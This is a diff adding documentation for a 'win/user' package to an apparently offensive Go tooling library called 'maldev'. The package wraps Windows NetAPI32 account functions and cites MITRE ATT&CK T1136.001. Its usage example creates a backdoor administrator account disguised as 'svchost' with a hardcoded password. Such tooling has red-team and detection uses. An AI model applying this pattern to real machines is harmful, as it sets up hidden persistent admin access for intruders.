@@ -15,6 +15,7 @@ The `win/` module provides the Windows-specific foundation for the entire maldev
 | `win/version` | OS version detection via RtlGetVersion + registry UBR | Windows |
 | `win/impersonate` | Thread impersonation with LogonUserW | Windows |
 | `win/domain` | Domain membership query | Windows |
+| `win/user` | Local user account management via NetAPI32 | Windows |
 | `win/syscall` | Syscall methods (WinAPI/NativeAPI/Direct/Indirect) -- see [syscalls.md](syscalls.md) | Windows |
 
 ---
@@ -543,4 +544,166 @@ import "github.com/oioio-space/maldev/win/domain"
 
 name, status, err := domain.Name()
 // name="CORP", status=3 (NetSetupDomainName)
+```
+
+---
+
+## win/user -- Local User Account Management
+
+Package `user` provides local Windows user account management via the NetAPI32 functions (`NetUserAdd`, `NetUserDel`, `NetUserSetInfo`, `NetLocalGroupAddMembers`, etc.). Useful for creating backdoor accounts, privilege escalation via group membership, and user enumeration.
+
+**MITRE ATT&CK:** T1136.001 (Create Account: Local Account)
+**Platform:** Windows
+**Detection:** High -- user creation generates Security event log entries (Event ID 4720).
+
+### Types
+
+#### `Info`
+
+```go
+type Info struct {
+    Name     string
+    FullName string
+    Comment  string
+    Flags    uint32
+}
+```
+
+Represents a local Windows user account.
+
+### Errors
+
+```go
+var (
+    ErrUserExists    = errors.New("user already exists")
+    ErrUserNotFound  = errors.New("user not found")
+    ErrAccessDenied  = errors.New("access denied")
+    ErrGroupNotFound = errors.New("group not found")
+)
+```
+
+### Functions
+
+#### `Add`
+
+```go
+func Add(name, password string) error
+```
+
+**Purpose:** Creates a new local user account with the given name and password. The account is created with `UF_SCRIPT | UF_DONT_EXPIRE_PASSWD` flags and `USER_PRIV_USER` privilege level.
+
+**Parameters:**
+- `name` -- Username for the new account.
+- `password` -- Password for the new account.
+
+**Returns:** `ErrUserExists` if the account already exists, `ErrAccessDenied` if not running as administrator.
+
+---
+
+#### `Delete`
+
+```go
+func Delete(name string) error
+```
+
+**Purpose:** Removes a local user account.
+
+---
+
+#### `SetPassword`
+
+```go
+func SetPassword(name, password string) error
+```
+
+**Purpose:** Changes a user's password via `NetUserSetInfo` level 1003.
+
+---
+
+#### `AddToGroup`
+
+```go
+func AddToGroup(name, group string) error
+```
+
+**Purpose:** Adds a user to a local group. The username is automatically qualified with the local hostname for domain-joined machines.
+
+---
+
+#### `RemoveFromGroup`
+
+```go
+func RemoveFromGroup(name, group string) error
+```
+
+**Purpose:** Removes a user from a local group.
+
+---
+
+#### `SetAdmin`
+
+```go
+func SetAdmin(name string) error
+```
+
+**Purpose:** Adds a user to the built-in Administrators group. Uses SID-based lookup (`S-1-5-32-544`) for locale independence -- works on non-English Windows where the group has a localized name.
+
+---
+
+#### `RevokeAdmin`
+
+```go
+func RevokeAdmin(name string) error
+```
+
+**Purpose:** Removes a user from the built-in Administrators group. Uses the same SID-based lookup as `SetAdmin`.
+
+---
+
+#### `Exists`
+
+```go
+func Exists(name string) bool
+```
+
+**Purpose:** Checks whether a local user account exists via `NetUserGetInfo` level 0.
+
+---
+
+#### `List`
+
+```go
+func List() ([]Info, error)
+```
+
+**Purpose:** Returns all local user accounts via `NetUserEnum`. Handles pagination internally (`ERROR_MORE_DATA`).
+
+---
+
+#### `IsAdmin`
+
+```go
+func IsAdmin() bool
+```
+
+**Purpose:** Checks whether the current process token is a member of the built-in Administrators group via proper SID membership check (handles UAC split tokens correctly).
+
+**Example:**
+
+```go
+import "github.com/oioio-space/maldev/win/user"
+
+// Create a backdoor account
+if err := user.Add("svchost", "P@ssw0rd123!"); err != nil {
+    log.Fatal(err)
+}
+if err := user.SetAdmin("svchost"); err != nil {
+    log.Fatal(err)
+}
+
+// Enumerate all users
+users, _ := user.List()
+for _, u := range users {
+    fmt.Println(u.Name)
+}
 ```
